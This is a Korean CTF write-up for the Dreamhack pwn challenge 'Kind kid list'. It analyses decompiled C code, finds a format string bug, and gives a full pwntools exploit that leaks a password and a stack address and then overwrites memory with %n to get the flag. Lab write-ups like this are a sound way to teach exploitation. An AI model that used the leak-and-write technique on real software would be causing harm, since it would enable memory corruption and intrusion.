---
title: "[Dreamhack] Kind kid list Write up"
author: d0razi
date: 2024-01-27 11:19
categories: [InfoSec, Pwn]
tags: [Write up, Dreamhack]
image: /assets/img/media/banner/dreamhack.jpg
---

# 코드 분석

```c
int __fastcall __noreturn main(int argc, const char ** argv, const char ** envp) {
    char * v3; // rsi
    char * v4; // rdi
    __int64 v5; // rdx
    __int64 v6; // rcx
    __int64 v7; // r8
    __int64 v8; // r9
    const char * v9; // rsi
    __int64 v10; // rdx
    __int64 v11; // rcx
    __int64 v12; // r8
    __int64 v13; // r9
    char s2[8]; // [rsp+0h] [rbp-E0h] BYREF
    __int64 v15; // [rsp+8h] [rbp-D8h]
    char v16[8]; // [rsp+10h] [rbp-D0h] BYREF
    __int64 v17; // [rsp+18h] [rbp-C8h]
    char dest[8]; // [rsp+20h] [rbp-C0h] BYREF
    __int64 v19; // [rsp+28h] [rbp-B8h]
    char v20[132]; // [rsp+30h] [rbp-B0h] BYREF
    char src[8]; // [rsp+B4h] [rbp-2Ch] BYREF
    int v22; // [rsp+BCh] [rbp-24h] BYREF
    FILE * stream; // [rsp+C0h] [rbp-20h]
    void * ptr; // [rsp+C8h] [rbp-18h]
    int v25; // [rsp+D4h] [rbp-Ch]
    int v26; // [rsp+D8h] [rbp-8h]
    int i; // [rsp+DCh] [rbp-4h]

    init(argc, argv, envp);
    intro();
    i = 0;
    v25 = 0;
    v22 = 0;
    v26 = 0;
    *(_QWORD * ) src = 'nr3vyw';
    memset(v20, 0, 0x80 uLL);
    *(_QWORD * ) dest = 0 LL;
    v19 = 0 LL;
    *(_QWORD * ) v16 = 0 LL;
    v17 = 0 LL;
    *(_QWORD * ) s2 = 0 LL;
    v15 = 0 LL;
    ptr = malloc(8 uLL);
    stream = fopen("/dev/urandom", "r");
    fread(ptr, 7 uLL, 1 uLL, stream);
    v3 = src;
    v4 = dest;
    strcpy(dest, src);
    while (1) {
        menu(v4, v3, v5, v6, v7, v8);
        fflush(stdout);
        v3 = (char * ) & v22;
        v4 = "%d";
        __isoc99_scanf("%d", & v22);
        if (v22 == 3)
            break;
        if (v22 <= 3) {
            if (v22 == 1) {
                puts("\n-Kind kid list-");
				
                for (i = 0; i <= 5; ++i)
                    puts( & v20[16 * i]);
                puts("\n-Naughty kid list-");
                for (i = 0; i <= 7; ++i)
                    putchar(dest[i]);
                v4 = (char * ) & byte_2072;
                puts( & byte_2072);
            } 
            
            else if (v22 == 2) {
	            printf("\nPassword : ");
                fflush(stdout);
                __isoc99_scanf("%8s", s2);
                v3 = s2;
                if (!strncmp((const char * ) ptr, s2, 7 uLL)) {
                    printf("Name : ");
                    fflush(stdout);
                    v3 = v16;
                    __isoc99_scanf("%8s", v16);
                    if (v26 > 7) {
                        v4 = "Kind list full";
                        puts("Kind list full");
                    } 
                    else {
                        v3 = v16;
                        v4 = & v20[16 * v26];
                        strcpy(v4, v16);
                        ++v26;
                    }
                } 
                else {
                    printf(s2); // FSB occurs
                    v4 = " is Wrong password!";
                    puts(" is Wrong password!");
                }
	        }
		}
    }
    v25 = 0;
    v9 = "wyv3rn";
    if (!strcmp(v20, "wyv3rn")) {
        for (i = 0; i <= 5; ++i) {
            v9 = & src[i];
            if (!strcmp( & dest[i], v9)) {
                puts("Wyv3rn : My name is still remain on the naughty kid list!");
                exit(0);
            }
        }
        puts("\nWyv3rn : You did it!");
        puts("Wyv3rn : Here is flag!");
        flag("Wyv3rn : Here is flag!", v9, v10, v11, v12, v13);
        exit(0);
    }
	puts("Wyv3rn : My name is not on the kind kid list!");
	exit(0);
}
```

정적 분석을 먼저 하려고 했었는데 정적 분석만으로는 속도가 나오지 않을 것 같아서 동적 분석을 먼저 했습니다.
## 1번 메뉴
![](https://i.imgur.com/TOfvZX3.png)

```c
if (v22 == 1) {
	puts("\n-Kind kid list-");

	for (i = 0; i <= 5; ++i)
		puts( & v20[16 * i]);
	puts("\n-Naughty kid list-");
	for (i = 0; i <= 7; ++i)
		putchar(dest[i]);
	v4 = (char * ) & byte_2072;
	puts( & byte_2072);
```
- v20의 0부터 5까지 인덱스의 원소를 출력합니다.
- dest의 0부터 7까지 인덱스의 원소를 출력합니다.
- v4에 byte_2072 주소를 저장하고 주소를 출력합니다.
## 2번 메뉴
![](https://i.imgur.com/bJkGXCR.png)

```c
else if (v22 == 2) {
	printf("\nPassword : ");
	fflush(stdout);
	__isoc99_scanf("%8s", s2);
	v3 = s2;
	if (!strncmp((const char * ) ptr, s2, 7 uLL)) {
		printf("Name : ");
		fflush(stdout);
		v3 = v16;
		__isoc99_scanf("%8s", v16);
		if (v26 > 7) {
			v4 = "Kind list full";
			puts("Kind list full");
		} 
		
		else {
			v3 = v16;
			v4 = & v20[16 * v26];
			strcpy(v4, v16);
			++v26;
		}
	}
	
	else {
		printf(s2); // FSB occurs
		v4 = " is Wrong password!";
		puts(" is Wrong password!");
	}
}
```

- s2에 password를 입력받습니다.
- strncmp 함수로 ptr과 s2를 비교합니다.
	- 만약 두 인자가 같으면 v16에 Name을 입력받습니다.
	- v26이 7보다 크면 "Kind list full" 이라는 문자열을 출력합니다. 
	- 크지 않으면 v16에 저장된 값을 v20 배열의 v26번째 위치에 저장하고 v26값을 1 증가시킵니다.
- 같지 않으면 s2를 출력해주는데 여기서 FSB가 터집니다.
- 그리고 "is Wrong password!" 라는 문자열을 출력해줍니다.
## 3번 메뉴
```c
v25 = 0;
v9 = "wyv3rn";
if (!strcmp(v20, "wyv3rn")) {
	for (i = 0; i <= 5; ++i) {
		v9 = & src[i];
		if (!strcmp( & dest[i], v9)) {
			puts("Wyv3rn : My name is still remain on the naughty kid list!");
			exit(0);
		}
	}
	puts("\nWyv3rn : You did it!");
	puts("Wyv3rn : Here is flag!");
	flag("Wyv3rn : Here is flag!", v9, v10, v11, v12, v13);
	exit(0);
}
puts("Wyv3rn : My name is not on the kind kid list!");
exit(0);
```
- strcmp 함수로 2번 메뉴 Name에서 입력받는 v20이랑 wyv3rn 문자열을 비교합니다.
	- 만약 두 변수가 같으면 for문을 돌면서 dest와 v9을 비교합니다. 만약 같으면 문자열을 출력하고 프로그램이 종료됩니다.
	- 같지 않으면 플래그가 출력됩니다.
- 다르면 그냥 종료됩니다.

# 문제 풀이
시나리오는 아래와 같습니다.
1. FSB로 password 값이 있는 ptr 값 leak
2. leak 한 password 를 이용해 v20에 "wyv3rn" 입력
3. FSB를 이용해 dest 주소 Leak & 값 변조
4. 3번 메뉴 실행
## password leak & Input wyv3rn
디컴파일 코드에서 ptr의 위치를 알 수 있었습니다.
```c
void *ptr; // [rsp+C8h] [rbp-18h]
```

그리고 FSB가 발생하는 printf 함수 위치에 bp를 설정하고 FSB 오프셋을 확인했습니다.
![](https://i.imgur.com/WkvMSGO.png)

이때 FSB 오프셋이 31이였습니다. 그래서 `%31$s` 를 입력해서 password 값을 leak 후 wyv3rn을 입력했습니다.
```python
from pwn import *

p = process('./kind_kid_list')
# p = remote('host3.dreamhack.games', 17941)

def fsb_trigger(msg):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b'Password : ', msg)
    output = p.recvline()
    index = output.find(b' is')
    return output[:index]

def kind_list(passwd, name):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b'Password : ', passwd)
    p.sendlineafter(b'Name : ', name)

# Leak Password
password = fsb_trigger(b'%31$s')

# Add kind List
kind_list(password, b'wyv3rn')

p.interactive()
```
## dest addr leak & 값 변조
```c
char dest[8]; // [rsp+20h] [rbp-C0h] BYREF
```

![](https://i.imgur.com/AJqLs7W.png)

스택에 39번째 오프셋에 dest 주소와 오프셋 계산이 가능한 스택의 주소가 들어있길래 FSB로 Leak 했습니다.

그리고 스택에 다시 dest 주소를 입력해야 FSB로 값 변경이 가능해서 어디에 입력을 해야할 지 찾던 중 Name\(v16)\[rbp-0xd0]에 입력을 하면 FSB 오프셋 8번째 위치에 입력되어서 값 변경이 가능한 걸 찾았습니다.
![](https://i.imgur.com/JGXqfIE.png)

# Exploit code

```python
from pwn import *

p = process('./kind_kid_list')
# p = remote('host3.dreamhack.games', 17941)

def fsb_trigger(msg):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b'Password : ', msg)
    output = p.recvline()
    index = output.find(b' is')
    return output[:index]

def kind_list(passwd, name):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b'Password : ', passwd)
    p.sendlineafter(b'Name : ', name)

# Leak Password
password = fsb_trigger(b'%31$s')

# Add kind List
kind_list(password, b'wyv3rn')

# Leak dest & Change dest Value
dest = int(fsb_trigger(b'%39$p'), 16) - 0x1d8
kind_list(password, p64(dest))
fsb_trigger(b'%8$ln')

# Exit program
p.sendlineafter(b'>>', b'3')
p.recvuntil(b'flag!\n')

p.interactive()
```

```bash
❯ py ex.py
[+] Starting local process './kind_kid_list': pid 1347
[*] Switching to interactive mode
DH{sample_flag}

[*] Process './kind_kid_list' stopped with exit code 0 (pid 1347)
[*] Got EOF while reading in interactive
$
```